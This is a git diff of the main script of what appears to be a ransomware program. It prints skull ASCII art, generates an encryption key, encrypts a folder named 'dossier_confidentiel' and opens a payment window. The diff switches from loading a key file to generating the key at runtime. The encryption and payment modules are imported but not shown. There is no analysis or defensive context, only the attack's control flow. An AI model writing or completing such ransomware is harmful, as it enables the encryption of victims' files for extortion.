@@ -1,12 +1,14 @@
 from crypto.encrypter import encrypt_folder
 from lessidoidlam1 import print_ascii_art
-from payment.payment import run
+from payment.payment import run_window
+from utils import generate_key
 
 print_ascii_art("skull_horns")
 
-with open("key.bin", "rb") as f:
-    key = f.read()
+key = generate_key()
 
 encrypt_folder("./dossier_confidentiel", key)
-run()
-# print_ascii_art("6doigts")
+
+run_window()
+
+print_ascii_art("6doigts")
